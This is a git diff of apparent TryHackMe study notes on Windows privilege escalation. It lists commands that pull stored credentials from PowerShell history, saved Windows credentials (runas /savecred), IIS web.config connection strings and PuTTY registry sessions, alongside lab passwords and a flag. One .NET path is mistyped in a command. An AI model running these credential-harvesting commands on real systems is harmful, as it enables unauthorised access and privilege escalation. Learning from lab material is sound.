@@ -16,7 +16,35 @@ Unattended Windows Installations
 -C:\Windows\system32\sysprep.inf
 -C:\Windows\system32\sysprep\sysprep.xml
 
-
 Powershell History
 cmd: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+*julia.jones /pass:ZuperCkretPa5z
+
+Saved Windows Credentials
+-option to save credentials on the system
+cmdkey /list
+-can't see pw 
+runas /savecred /user:admin cmd.exe
+
+*C:\Users\mike.katz\Desktop>type flag.txt
+*THM{WHAT_IS_MY_PASSWORD}
+
+IIS configuration
+-Internet Information Services: default web server on Windows installations
+-stored in a file: web.config at:
+1. C:\inetpub\wwwroot\web.config
+2. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.40319\Config\web.config | findstr connectionString
+
+*ID=db_admin;Password=098n0x35skjD3
+
+Retrieve credentials from software
+-PuTTy is an SSH client commonly found on Windows systems. 
+-store proxy configs including clear text auth creds
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+-Simon Tatham is creator of PuTTY - name is part of path
+*ProxyUsername: thom.smith
+*ProxyPassword: CoolPass2021
+
